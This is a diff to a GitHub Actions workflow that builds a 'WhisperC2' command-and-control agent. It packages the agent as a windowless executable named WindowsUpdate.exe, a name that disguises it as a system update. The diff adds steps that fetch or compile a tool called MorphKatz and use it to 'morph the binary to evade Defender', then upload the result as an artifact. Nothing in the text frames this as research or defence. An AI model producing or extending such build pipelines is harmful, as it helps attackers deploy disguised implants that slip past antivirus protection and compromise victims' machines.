@@ -1,4 +1,4 @@
-name: Build WhisperC2 Windows Executable
+ name: Build WhisperC2 Windows Executable (Morphed)
 
 on:
   push:
@@ -27,8 +27,43 @@ jobs:
         run: |
           pyinstaller --onefile --noconsole --icon=69.ico --name WindowsUpdate agent.py
 
-      - name: Upload artifact
+      # ------------------------------------------------------------------
+      # Morph the binary to evade Defender (fully automated)
+      # ------------------------------------------------------------------
+      - name: Download pre‑built MorphKatz (Windows binary)
+        run: |
+          curl -L -o morphkatz.exe https://github.com/0xMohammedHassan/morphkatz/releases/latest/download/morphkatz.exe
+        continue-on-error: true   # if the release isn't available, we'll build from source
+
+      - name: Morph the binary with pre‑built MorphKatz
+        if: success()
+        run: |
+          morphkatz.exe dist/WindowsUpdate.exe --seed ${{ github.run_number }} --data-morph on
+        continue-on-error: true
+
+      # Fallback: build MorphKatz from source if the pre‑built binary failed
+      - name: Setup MSBuild (for building MorphKatz from source)
+        if: failure()
+        uses: microsoft/setup-msbuild@v1.1
+
+      - name: Build MorphKatz from source
+        if: failure()
+        run: |
+          git clone https://github.com/0xMohammedHassan/morphkatz.git morph_src
+          cd morph_src
+          mkdir build && cd build
+          cmake .. -G "Visual Studio 17 2022" -A x64
+          cmake --build . --config Release
+          copy Release\morphkatz.exe ..\..\morphkatz.exe
+
+      - name: Morph the binary with freshly‑built MorphKatz
+        if: failure()
+        run: |
+          morphkatz.exe dist/WindowsUpdate.exe --seed ${{ github.run_number }} --data-morph on
+
+      # ------------------------------------------------------------------
+      - name: Upload morphed artifact
         uses: actions/upload-artifact@v4
         with:
-          name: WhisperC2
+          name: WhisperC2-Morphed
           path: dist/WindowsUpdate.exe
